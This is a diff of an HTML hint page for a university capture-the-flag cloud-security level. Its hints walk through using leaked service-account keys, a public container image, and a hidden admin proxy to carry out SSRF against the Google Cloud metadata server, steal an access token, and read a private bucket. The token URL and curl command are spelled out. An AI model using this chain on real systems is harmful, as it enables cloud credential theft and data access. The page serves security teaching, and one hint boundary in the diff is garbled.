@@ -24,31 +24,34 @@
       <a class="levelbanner levelbutton" href="../..">&#8592</a>
       <h2 class="levelbanner">thunder/a6container</h2>
     </div>
-    <h3 style="text-align: left; padding-left:5px;">Setup:</h3>
-    <pre>python3 thunder.py create thunder/a6container</pre>
-      <p>Activate the service account given to you. You MUST do this, as using your google user account to complete the level would be considered cheating.</p>
-      <pre>gcloud auth activate-service-account --key-file=start/a6-access.json</pre>
-    <h3 style="text-align: left; padding-left:5px;">Destroy:</h3>
-    <pre>python3 thunder.py destroy</pre>
   </div>
   <br>
   <div class=hints>
     <div>
       <span id="prev" class="hintbanner hintbutton buttondisabled">Prev</span>
-      <span id="hinttitle" class="hintbanner hintbannertext">test</span>
+      <span id="hint_title" class="hintbanner hintbannertext"></span>
       <span id="next" class="hintbanner hintbutton">Next</span>
     </div>
-    <div id="hintdisplay" class="hintdisplay">
-      <pre>testpre</pre>
+    <div id="hint_display" class="hintdisplay">
     </div>
+    <div>
+      <span id="writeup_button" class="hintbanner hintbannertext">Show Level Writeup</span>
+    </div>
+    <h3>Destroy:</h3>
+    <pre>python3 thunder.py destroy</pre>
   </div>
   <footer class="bottombanner">PSU CTF: Work done under NSF Award #1821841</footer>
-
-
 
   <ul id="hint_content" style="display: none">
     <li>
       <span>Intro</span>
+      <h3>Setup:</h3>
+      <p>Your virtual environment must be active to use thunder.py:</p>
+      <pre>source ../env-tctf/bin/activate</pre>
+      <pre>python3 thunder.py create thunder/a6container</pre>
+      <p>Activate the service account given to you. You MUST do this, or the level will not work as intended.</p>
+      <pre>gcloud auth activate-service-account --key-file=start/a6-access.json</pre>
+      <h3>Intro:</h3>
       <p>Use the compromised service account credentials stored in a6-access.json to find the secret, which is located in a file called secret.txt in a private bucket on the project.</p>
     </li>
     
@@ -60,10 +63,7 @@
     <li>
       <span>Hint 2</span>
       <p>The credentials have the permission compute.instances.list and compute.instances.get</p>
-    </li>
-    
-    <li>
-      <span>Hint 3</span>
+---˝
       <p>List the instances in the project:</p>
       <pre>gcloud compute instances list</pre>
       <p>Get information on the running instance:</p>
@@ -71,7 +71,7 @@
     </li>
     
     <li>
-      <span>Hint 4</span>
+      <span>Hint 3</span>
       <p>The instance has the network tag "http-server," meaning it accepts traffic on port 80</p>
       <pre>tags:
   fingerprint: FYLDgkTKlA4=
@@ -81,7 +81,7 @@
     </li>
     
     <li>
-      <span>Hint 5</span>
+      <span>Hint 4</span>
       <p>The home page of the webapp doesn't have any useful information.</p>
       <p>However, notice from the instance metadata displayed from running "instances describe" that the webapp is running from a container on the instance:</p>
       <pre>metadata:
@@ -104,13 +104,13 @@
     </li>
     
     <li>
-      <span>Hint 6</span>
+      <span>Hint 5</span>
       <p>The container image specified in the manifest is publicly available on Docker Hub. See if there's anything you can find on the container image.</p>
       <pre>image: docker.io/springern/thunder-ctf-a6:latest</pre>
     </li>
     
     <li>
-      <span>Hint 7</span>
+      <span>Hint 6</span>
       <p>Pull the image:</p>
       <pre>docker pull springern/thunder-ctf-a6:latest</pre>
       <p>Create a container from the image and start an interactive shell session:</p>
@@ -118,12 +118,12 @@
     </li>
     
     <li>
-      <span>Hint 8</span>
+      <span>Hint 7</span>
       <p>The container seems to be running on flask. Look in "app.py" to see the logic of the webapp</p>
     </li>
     
     <li>
-      <span>Hint 9</span>
+      <span>Hint 8</span>
       <p>It seems there is a secret admin page with a proxy, meaning you can make GET requests from the server.</p>
       <pre>@app.route('/admin-proxy-aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d')
 def proxy():
@@ -135,28 +135,28 @@ def proxy():
     </li>
     
     <li>
-      <span>Hint 10</span>
+      <span>Hint 9</span>
       <p>Instances get access tokens from the metadata server just like cloud functions.</p>
     </li>
     
     <li>
-      <span>Hint 11</span>
+      <span>Hint 10</span>
       <p>This web application is vulnerable to an <a class="inline" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-google-cloud">SSRF attack.</a></p>
     </li>
     
     <li>
-      <span>Hint 12</span>
+      <span>Hint 11</span>
       <p>To get an access token from the instance, input the following url into the admin proxy:</p>
       <pre>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</pre>
     </li>
     
     <li>
-      <span>Hint 13</span>
+      <span>Hint 12</span>
       <p>Test the permissions of the token using the test-permissions.py script.</p>
     </li>
     
     <li>
-      <span>Hint 14</span>
+      <span>Hint 13</span>
       <p>The token gives the permission storage.objects.get, meaning you can now get the contents of secret.txt using the <a a class="inline" href="https://cloud.google.com/storage/docs/json_api/v1/objects/get">GCS REST API.</a></p>
       <p>To find the location of secret.txt:</p>
       <pre>gsutil ls
@@ -164,12 +164,15 @@ gsutil ls [bucket-name]</pre>
     </li>
     
     <li>
-      <span>Hint 15</span>
+      <span>Hint 14</span>
       <p>Get secret.txt:</p>
       <pre>curl https://www.googleapis.com/storage/v1/b/[BUCKET-NAME]/o/[OBJECT-NAME]?alt=media -H "Authorization: Bearer [ACCESS-TOKEN]"</pre>
     </li>
     
   </ul>
+  <div id="writeup_content" style="display: none">
+    <p>INSERT WRITEUP</p>
+  </div>
 
   <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
   <script src="../static/slideshow.js"></script>
